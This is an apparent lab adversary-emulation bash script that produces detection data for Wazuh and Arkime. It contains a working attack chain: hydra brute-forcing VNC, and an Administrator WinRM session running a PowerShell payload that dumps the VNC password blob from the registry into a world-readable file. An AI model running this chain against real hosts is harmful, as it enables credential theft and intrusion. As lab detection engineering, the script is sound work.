#!/usr/bin/env bash
set -uo pipefail

# Live "previous adversary" emulation against the SecretCon EWS:
#   1. tcpdump captures the VNC handshake on the host capture interface
#   2. hydra brute-forces TCP/5900 with the SecLists default-VNC list
#      (terminates on the planted FELDTECH_VNC entry)
#   3. an Administrator WinRM session runs a PowerShell payload that
#      reads the VNC password registry blob and writes the hex
#      blob to C:\Users\Public\vnc-pwd-dump.txt (the file Wazuh tails for
#      the rule 100806 exfil receipt)
#   4. tcpdump is stopped, the raw capture is trimmed to RFB-only frames
#      and staged into infrastructure/arkime-docker/pcaps/vnc_auth.pcap
#   5. the captured Wazuh alerts are exported as a portable dataset for
#      replay-on-deploy via scripts/observability/vnc-replay-on-deploy.sh
#
# Outputs land under:
#   artifacts/ews/vnc-foothold/<run-id>/
#     vnc-attack-raw.pcap
#     vnc_auth.pcap                (trimmed, also copied into arkime-docker/pcaps/)
#     hydra.log
#     winrm-payload.log
#     dataset/                     (produced by wazuh-export-dataset.sh)
#     summary.json
#
# Usage:
#   ./scripts/observability/vnc-adversary-emulation.sh \
#       --target 127.0.0.1 --vnc-port 15900 --winrm-port 15985 \
#       --wordlist /path/to/vnc-betterdefaultpasslist.txt
#
#   ./scripts/observability/vnc-adversary-emulation.sh \
#       --target 192.168.61.20 --vnc-port 5900 --winrm-port 5985 \
#       --capture-iface vmbr1
#
# Flags:
#   --target IP            EWS host (default 127.0.0.1; local-QEMU forwarded)
#   --vnc-port N           VNC port (default 5900; 15900 for local-QEMU)
#   --winrm-port N         WinRM port (default 5985; 15985 for local-QEMU)
#   --admin-user U         WinRM user (default Administrator)
#   --admin-pass P         WinRM password (default packer; env ADMIN_PW wins)
#   --capture-iface IF     tcpdump -i value (default lo for local-QEMU,
#                          override to vmbr1 / etc for Proxmox lab)
#   --wordlist PATH        VNC password list (default looks up SecLists)
#   --run-id ID            artifact subdir name (default ews-vnc-<UTC>)
#   --skip-export          do not call wazuh-export-dataset.sh
#   --skip-arkime          do not copy the trimmed PCAP into arkime-docker/pcaps/
#   --push-to-crit-capture also push the trimmed PCAP to crit-capture (.11) Arkime
#                          via scripts/proxmox/sync-arkime-pcap.sh; needs
#                          PROXMOX_HOST + PROXMOX_PASSWORD in .env

REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"

TARGET="127.0.0.1"
VNC_PORT="5900"
WINRM_PORT="5985"
ADMIN_USER="Administrator"
ADMIN_PW="${ADMIN_PW:-packer}"
CAPTURE_IFACE=""
WORDLIST=""
RUN_ID=""
SKIP_EXPORT=0
SKIP_ARKIME=0
PUSH_TO_CRIT_CAPTURE=0

while [ $# -gt 0 ]; do
    case "$1" in
        --target) TARGET="$2"; shift 2 ;;
        --vnc-port) VNC_PORT="$2"; shift 2 ;;
        --winrm-port) WINRM_PORT="$2"; shift 2 ;;
        --admin-user) ADMIN_USER="$2"; shift 2 ;;
        --admin-pass) ADMIN_PW="$2"; shift 2 ;;
        --capture-iface) CAPTURE_IFACE="$2"; shift 2 ;;
        --wordlist) WORDLIST="$2"; shift 2 ;;
        --run-id) RUN_ID="$2"; shift 2 ;;
        --skip-export) SKIP_EXPORT=1; shift ;;
        --skip-arkime) SKIP_ARKIME=1; shift ;;
        --push-to-crit-capture) PUSH_TO_CRIT_CAPTURE=1; shift ;;
        -h|--help) sed -n '3,55p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
        *) echo "[!] unknown flag: $1" >&2; exit 2 ;;
    esac
done

if [ -z "$RUN_ID" ]; then
    RUN_ID="ews-vnc-$(date -u +%Y%m%dT%H%M%SZ)"
fi
OUT_DIR="${REPO_ROOT}/artifacts/ews/vnc-foothold/${RUN_ID}"
mkdir -p "$OUT_DIR"

LOG="${OUT_DIR}/run.log"
exec > >(tee -a "$LOG") 2>&1

echo "[*] Run ID: ${RUN_ID}"
echo "    Target:    ${TARGET}:${VNC_PORT} (VNC) / ${TARGET}:${WINRM_PORT} (WinRM)"
echo "    Out dir:   ${OUT_DIR}"

# ----------------------------------------------------------- tool preflight
require_cmd() {
    local missing=()
    for c in "$@"; do
        if ! command -v "$c" >/dev/null 2>&1; then
            missing+=("$c")
        fi
    done
    if [ "${#missing[@]}" -gt 0 ]; then
        echo "[!] missing required commands: ${missing[*]}" >&2
        echo "    try: nix develop" >&2
        exit 2
    fi
}
require_cmd tcpdump hydra tshark python3 jq

# Locate vnc-betterdefaultpasslist.txt unless --wordlist was given.
if [ -z "$WORDLIST" ]; then
    for candidate in \
        /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt \
        /usr/share/wordlists/SecLists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt \
        "${HOME}/SecLists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt" \
        "${REPO_ROOT}/provisioning/wordlists/vnc-betterdefaultpasslist.txt" ; do
        if [ -f "$candidate" ]; then
            WORDLIST="$candidate"
            break
        fi
    done
fi

if [ -z "$WORDLIST" ] || [ ! -f "$WORDLIST" ]; then
    echo "[!] could not locate vnc-betterdefaultpasslist.txt; pass --wordlist PATH" >&2
    exit 2
fi
echo "    Wordlist:  ${WORDLIST}"

# Default capture interface: lo for local-QEMU (127.0.0.1), else `any`.
if [ -z "$CAPTURE_IFACE" ]; then
    if [ "$TARGET" = "127.0.0.1" ] || [ "$TARGET" = "::1" ] || [ "$TARGET" = "localhost" ]; then
        CAPTURE_IFACE="lo"
    else
        CAPTURE_IFACE="any"
    fi
fi
echo "    Capture:   tcpdump -i ${CAPTURE_IFACE}"

RAW_PCAP="${OUT_DIR}/vnc-attack-raw.pcap"
TRIMMED_PCAP="${OUT_DIR}/vnc_auth.pcap"
HYDRA_LOG="${OUT_DIR}/hydra.log"
WINRM_LOG="${OUT_DIR}/winrm-payload.log"

# Adversary source IP recorded into summary (informational; for live runs
# this is whatever the kernel uses to reach $TARGET).
SRC_IP="$(ip route get "$TARGET" 2>/dev/null | awk '/src/ {for (i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true)"
SRC_IP="${SRC_IP:-unknown}"

# --------------------------------------------------------- start tcpdump
echo ""
echo "[*] Starting tcpdump on ${CAPTURE_IFACE} (filter: tcp port ${VNC_PORT})"
# -U for line-buffered, -B 8192 for larger ring; tcpdump needs CAP_NET_RAW
# or root (we expect this on NixOS via wrap-program or run via sudo).
SUDO=""
if [ "$EUID" -ne 0 ]; then
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo -n"
    fi
fi
${SUDO} tcpdump -i "$CAPTURE_IFACE" -U -B 8192 -w "$RAW_PCAP" \
    "tcp port ${VNC_PORT}" >/dev/null 2>"${OUT_DIR}/tcpdump.err" &
TCPDUMP_PID=$!
sleep 2
if ! kill -0 "$TCPDUMP_PID" 2>/dev/null; then
    echo "[!] tcpdump failed to start; check ${OUT_DIR}/tcpdump.err" >&2
    cat "${OUT_DIR}/tcpdump.err" >&2 || true
    exit 1
fi

cleanup() {
    if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        ${SUDO} kill -INT "$TCPDUMP_PID" 2>/dev/null || true
        wait "$TCPDUMP_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

# --------------------------------------------------------- hydra brute force
echo ""
echo "[*] Running hydra against ${TARGET}:${VNC_PORT}"
echo "    (wordlist has ~40 entries; planted credential is FELDTECH_VNC)"
set +e
hydra -t 1 -V -P "$WORDLIST" -s "$VNC_PORT" "$TARGET" vnc \
    > "$HYDRA_LOG" 2>&1
HYDRA_RC=$?
set -e
if [ "$HYDRA_RC" -ne 0 ]; then
    echo "[!] hydra exited ${HYDRA_RC}; continuing (it returns non-zero on partial finds)"
fi
RECOVERED_PW="$(awk -F'password: ' '/host:.*password:/ {print $2; exit}' "$HYDRA_LOG" || true)"
if [ -z "$RECOVERED_PW" ]; then
    echo "[!] hydra did not recover a password; aborting"
    echo "    See ${HYDRA_LOG}"
    exit 1
fi
echo "[+] hydra recovered password: ${RECOVERED_PW}"

# --------------------------------------------------------- WinRM payload
echo ""
echo "[*] Pushing PowerShell exfil payload over WinRM (${TARGET}:${WINRM_PORT})"

# Payload reads the UltraVNC password blob first, falls back to the legacy
# TightVNC key for old images, then writes the hex receipt Wazuh tails.
# The receipt file is tailed by Wazuh per shared/ews/agent.conf.
read -r -d '' PAYLOAD <<'PS' || true
$ErrorActionPreference = "Stop"
$dump = "C:\Users\Public\vnc-pwd-dump.txt"
$paths = @(
  "HKLM:\SOFTWARE\ORL\WinVNC3",
  "HKLM:\SOFTWARE\TightVNC\Server"
)
$bytes = $null
$source = $null
foreach ($path in $paths) {
  if (Test-Path -LiteralPath $path) {
    $value = (Get-ItemProperty -Path $path -Name Password -ErrorAction SilentlyContinue).Password
    if ($null -ne $value) {
      $bytes = $value
      $source = $path
      break
    }
  }
}
if ($null -eq $bytes) {
  throw "Could not read VNC Password value from known registry paths"
}
$hex = [BitConverter]::ToString($bytes)
$ts = (Get-Date).ToString("o")
$line = "[$ts] VNC password blob (hex): $hex (source=$source, host=$env:COMPUTERNAME, user=$env:USERNAME)"
Add-Content -LiteralPath $dump -Value $line -Encoding ascii
icacls $dump /grant "Everyone:(R)" | Out-Null
Write-Host "WROTE: $dump"
Write-Host "BYTES: $hex"
PS

python3 - "$TARGET" "$WINRM_PORT" "$ADMIN_USER" "$ADMIN_PW" "$PAYLOAD" \
    > "$WINRM_LOG" 2>&1 <<'PY'
import sys
try:
    import winrm
except ImportError:
    sys.exit("pywinrm not available; run inside `nix develop`")

target, port, user, pw, script = sys.argv[1:6]
s = winrm.Session(
    f"http://{target}:{port}/wsman",
    auth=(user, pw),
    transport="ntlm",
    operation_timeout_sec=120,
    read_timeout_sec=130,
)
r = s.run_ps(script)
sys.stdout.write(r.std_out.decode("utf-8", "replace"))
sys.stderr.write(r.std_err.decode("utf-8", "replace"))
sys.exit(r.status_code)
PY
WINRM_RC=$?
if [ "$WINRM_RC" -ne 0 ]; then
    echo "[!] WinRM payload exited ${WINRM_RC}; see ${WINRM_LOG}"
    cat "$WINRM_LOG" >&2 || true
fi

RECOVERED_HEX="$(awk '/^BYTES:/ {print $2}' "$WINRM_LOG" | head -n1)"
if [ -n "$RECOVERED_HEX" ]; then
    echo "[+] reg key readout (hex): ${RECOVERED_HEX}"
fi

# --------------------------------------------------------- stop tcpdump + trim
echo ""
echo "[*] Stopping tcpdump"
cleanup
trap - EXIT

if [ -s "$RAW_PCAP" ]; then
    echo "[*] Trimming raw capture to RFB frames via tshark"
    tshark -r "$RAW_PCAP" -Y "vnc || rfb || tcp.port == ${VNC_PORT}" \
        -w "$TRIMMED_PCAP" 2>"${OUT_DIR}/tshark.err" || {
            echo "[!] tshark trim failed; keeping raw capture as the staged PCAP"
            cp -f "$RAW_PCAP" "$TRIMMED_PCAP"
        }
    echo "    raw:     $(du -h "$RAW_PCAP" | awk '{print $1}') ${RAW_PCAP}"
    echo "    trimmed: $(du -h "$TRIMMED_PCAP" | awk '{print $1}') ${TRIMMED_PCAP}"
else
    echo "[!] raw PCAP is empty -- capture interface ${CAPTURE_IFACE} likely wrong"
fi

# --------------------------------------------------------- stage into Arkime
if [ "$SKIP_ARKIME" -eq 0 ] && [ -s "$TRIMMED_PCAP" ]; then
    ARKIME_PCAP_DIR="${REPO_ROOT}/infrastructure/arkime-docker/pcaps"
    mkdir -p "$ARKIME_PCAP_DIR"
    cp -f "$TRIMMED_PCAP" "${ARKIME_PCAP_DIR}/vnc_auth.pcap"
    echo "[+] Staged ${ARKIME_PCAP_DIR}/vnc_auth.pcap"
    if [ -x "${REPO_ROOT}/scripts/arkime-import-pcap.sh" ] \
        && docker ps --format '{{.Names}}' 2>/dev/null | grep -q '^arkime\.viewer$'; then
        echo "[*] Importing into running Arkime stack"
        "${REPO_ROOT}/scripts/arkime-import-pcap.sh" --tag "ews-vnc-foothold" --tag "${RUN_ID}" \
            "${ARKIME_PCAP_DIR}/vnc_auth.pcap" || true
    else
        echo "[i] Arkime stack not running; bring up + auto-import:"
        echo "    ./scripts/arkime-docker-up.sh"
    fi
fi

# --------------------------------------------------------- push to crit-capture (prod Arkime)
if [ "$PUSH_TO_CRIT_CAPTURE" -eq 1 ] && [ -s "$TRIMMED_PCAP" ]; then
    echo ""
    echo "[*] Pushing trimmed pcap to crit-capture (.11) Arkime"
    SYNC_SCRIPT="${REPO_ROOT}/scripts/proxmox/sync-arkime-pcap.sh"
    if [ -x "$SYNC_SCRIPT" ]; then
        "$SYNC_SCRIPT" \
            --tag "vnc-public-attack" \
            --tag "run:${RUN_ID}" \
            "$TRIMMED_PCAP" \
            2>&1 | tee "${OUT_DIR}/sync-arkime-prod.log" \
            || echo "[!] sync-arkime-pcap.sh exited non-zero (see ${OUT_DIR}/sync-arkime-prod.log)"
    else
        echo "[!] ${SYNC_SCRIPT} missing/not executable; skipping push"
    fi
fi

# --------------------------------------------------------- export dataset
if [ "$SKIP_EXPORT" -eq 0 ]; then
    echo ""
    echo "[*] Exporting Wazuh dataset for replay-on-deploy"
    if [ -x "${REPO_ROOT}/scripts/wazuh-export-dataset.sh" ]; then
        "${REPO_ROOT}/scripts/wazuh-export-dataset.sh" \
            --run-id "${RUN_ID}" \
            --source-dir "${OUT_DIR}" \
            --out-dir "${OUT_DIR}/dataset" \
            || echo "[!] wazuh-export-dataset.sh failed; skipping (see log above)"
    else
        echo "[!] scripts/wazuh-export-dataset.sh missing"
    fi
fi

# --------------------------------------------------------- summary
cat > "${OUT_DIR}/summary.json" <<EOF
{
  "run_id": "${RUN_ID}",
  "started": "$(date -u -r "$RAW_PCAP" +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u +%Y-%m-%dT%H:%M:%SZ)",
  "ended":   "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target_ip":       "${TARGET}",
  "target_vnc_port": ${VNC_PORT},
  "source_ip":       "${SRC_IP}",
  "wordlist":        "${WORDLIST}",
  "recovered_password": "${RECOVERED_PW}",
  "recovered_hex_blob": "${RECOVERED_HEX:-}",
  "pcap_raw":     "${RAW_PCAP}",
  "pcap_trimmed": "${TRIMMED_PCAP}",
  "hydra_log":    "${HYDRA_LOG}",
  "winrm_log":    "${WINRM_LOG}"
}
EOF

echo ""
echo "[+] Run complete: ${OUT_DIR}/summary.json"
